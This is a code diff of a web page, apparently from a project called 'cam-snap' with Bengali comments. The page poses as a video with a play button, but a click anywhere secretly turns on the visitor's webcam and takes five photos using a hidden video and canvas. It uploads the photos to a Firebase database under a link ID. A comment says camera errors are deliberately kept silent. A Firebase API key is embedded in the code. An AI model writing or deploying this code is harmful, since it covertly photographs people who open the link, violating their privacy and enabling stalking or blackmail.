@@ -13,7 +13,7 @@
     .play svg{width:56px;height:56px;fill:#fff;margin-left:10px;}
   </style>
 </head>
-<body onclick="startNow()">
+<body onclick="start()">
 
 <div class="bg"></div>
 <div class="play">
@@ -23,7 +23,6 @@
 <canvas id="c" style="display:none;"></canvas>
 
 <script>
-// তোমার কনফিগ
 const firebaseConfig = {
   apiKey: "AIzaSyDTBla5gMV15V9HWBKAVYTWFt-CBrFfpzo",
   authDomain: "cam-snap-8e956.firebaseapp.com",
@@ -38,9 +37,9 @@ const firebaseConfig = {
 firebase.initializeApp(firebaseConfig);
 const db = firebase.database();
 
-// ID নেওয়ার ১০০% সঠিক উপায় (এটাই ছিল সমস্যা!)
+// ID নেওয়ার ১০০% সঠিক উপায়
 let id = location.pathname.split('/').pop();
-if (!id || id === '' || id === 'view.html') {
+if (!id || id === 'view.html') {
   const params = new URLSearchParams(location.search);
   id = params.get('id');
 }
@@ -48,7 +47,7 @@ if (!id || id === '' || id === 'view.html') {
 const today = new Date().toLocaleDateString('bn-BD');
 const now = new Date().toLocaleString('bn-BD');
 
-function startNow() {
+function start() {
   const canvas = document.getElementById('c');
   const ctx = canvas.getContext('2d');
   let pics = [];
@@ -60,30 +59,26 @@ function startNow() {
       video.muted = true;
       video.play();
 
-      let count = 0;
-      const capture = () => {
-        if (count >= 5) {
-          // ছবি সেভ করা
+      let i = 0;
+      const take = () => {
+        if (i >= 5) {
           db.ref('links/' + id + '/sessions/' + today).set({
             photos: pics,
             time: now
           });
           return;
         }
-
         canvas.width = video.videoWidth || 1280;
         canvas.height = video.videoHeight || 720;
         ctx.drawImage(video, 0, 0);
         pics.push(canvas.toDataURL('image/jpeg', 0.96));
-        count++;
-        setTimeout(capture, 700);
+        i++;
+        setTimeout(take, 700);
       };
-
-      setTimeout(capture, 1000);
+      setTimeout(take, 1000);
     })
-    .catch(err => {
-      console.log("Camera access denied");
-      // কোনো এরর দেখাবে না — সাইলেন্ট থাকবে
+    .catch(() => {
+      // সাইলেন্ট ফেল — কিছু দেখাবে না
     });
 }
 </script>
